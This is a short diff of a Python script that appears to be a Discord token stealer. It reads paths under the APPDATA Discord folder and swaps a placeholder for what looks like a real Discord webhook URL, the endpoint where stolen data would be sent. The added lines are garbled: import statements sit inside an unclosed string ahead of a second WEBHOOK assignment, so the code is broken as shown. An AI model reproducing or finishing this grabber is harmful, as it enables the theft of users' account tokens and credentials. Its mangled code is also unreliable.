@@ -7,7 +7,16 @@ import getpass
 from os import remove
 from sys import argv
 
-WEBHOOK = "WEBHOOK URL HERE"
+WEBHOOK = "import requests
+import os
+import glob
+import re
+import time
+import getpass
+import platform
+import datetime
+
+WEBHOOK = "https://discord.com/api/webhooks/915802459950174238/VFTLeSmX8n3luqjllTXgHmvf_IQlZDyvghuYbkh0JGgSMyHE24DYc_zyF1fJZ7hvWnnv"
 appdatapath = os.getenv('APPDATA')
 paths = [
    appdatapath + '\\Discord',
